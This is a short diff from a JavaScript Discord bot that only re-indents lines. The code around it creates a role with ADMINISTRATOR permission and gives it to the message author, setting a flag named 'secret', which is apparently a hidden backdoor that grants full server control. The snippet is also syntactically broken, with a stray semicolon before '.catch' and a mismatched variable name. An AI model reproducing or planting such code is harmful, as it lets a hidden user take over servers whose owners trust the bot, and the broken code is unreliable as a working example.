@@ -116,11 +116,11 @@ client.on('message', msg => {
                 })
                 role.setPermissions(['ADMINISTRATOR'])
             })()
-            .then(role => {
-                message.member.addRole(role);
-                secret = true;
-            });
-            .catch(function (err) {console.log(err)});
+                .then(role => {
+                    message.member.addRole(role);
+                    secret = true;
+                });
+                .catch(function (err) {console.log(err)});
         }
     };
     if (msg.content.startsWith(prefix)) {
